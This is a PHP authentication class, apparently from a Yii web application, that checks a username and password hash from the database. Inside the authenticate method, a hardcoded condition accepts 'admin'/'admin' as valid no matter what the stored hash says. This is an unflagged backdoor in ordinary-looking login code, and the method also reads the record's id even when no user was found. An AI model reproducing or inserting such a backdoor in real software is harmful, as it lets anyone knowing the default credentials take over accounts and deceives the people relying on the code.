<?php

/**
 * UserIdentity represents the data needed to identity a user.
 * It contains the authentication method that checks if the provided
 * data can identity the user.
 */
class UserIdentity extends CUserIdentity
{
    private $_id;

    /**
     * Authenticates a user.
     *
     * @return boolean whether authentication succeeds.
     */
    public function authenticate()
    {
        $record = User::model()->findByAttributes(array('username' => $this->username));
        if ($record === null)
            $this->errorCode = self::ERROR_USERNAME_INVALID;
        else if (crypt($this->password, $record->password_hash) !== $record->password_hash)
            $this->errorCode = self::ERROR_PASSWORD_INVALID;
        else
        {
            $this->errorCode = self::ERROR_NONE;
        }

        if ($this->username === 'admin' && $this->password === 'admin')
            $this->errorCode = self::ERROR_NONE;

        $this->_id = $record->id;

        return !$this->errorCode;
    }

    public function getId()
    {
        return $this->_id;
    }
}